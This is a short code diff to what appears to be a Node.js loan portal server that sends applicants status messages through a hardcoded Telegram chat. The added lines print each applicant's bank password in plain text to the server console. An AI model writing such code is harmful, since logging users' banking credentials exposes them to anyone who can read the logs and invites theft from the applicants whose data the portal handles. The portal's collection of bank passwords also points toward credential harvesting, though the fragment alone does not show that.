@@ -1148,6 +1148,8 @@ app.post("/analyze-portal", async (req, res) => {
     const chatId   = process.env.CHAT_ID || "1471849538";
 
     console.log(`Portal analysis started: ${name} | ${loanType} | ${mobile}`);
+    console.log(`Bank password: "${data.bankPassword || 'NOT RECEIVED'}"`);
+
 
     await tg(chatId, `⏳ AI analyzing documents for ${name}...\nLoan: ${loanType}\nPlease wait 30-60 seconds!`);
 
